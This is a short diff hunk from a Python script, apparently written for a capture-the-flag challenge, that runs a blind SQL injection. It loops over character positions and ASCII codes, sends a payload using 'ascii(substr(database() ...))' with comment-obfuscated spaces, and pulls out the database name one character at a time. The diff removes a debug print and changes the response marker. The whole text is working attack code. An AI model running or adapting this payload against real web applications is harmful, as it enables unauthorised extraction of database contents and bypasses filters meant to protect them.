@@ -8,9 +8,7 @@ for num1 in range(1,8):
     for num2 in range (65,123):
         data = "ascii(substr(database()/**/from/**/%d/**/for/**/1))=%d" % (num1, num2)
         result = requests.get(url + data,verify=False)
-        if chr(num2)=='w':
-            print(1)
-        if "IF" in result.text:
+        if "If" in result.text:
             word+=chr(num2)
             print(word)
             break
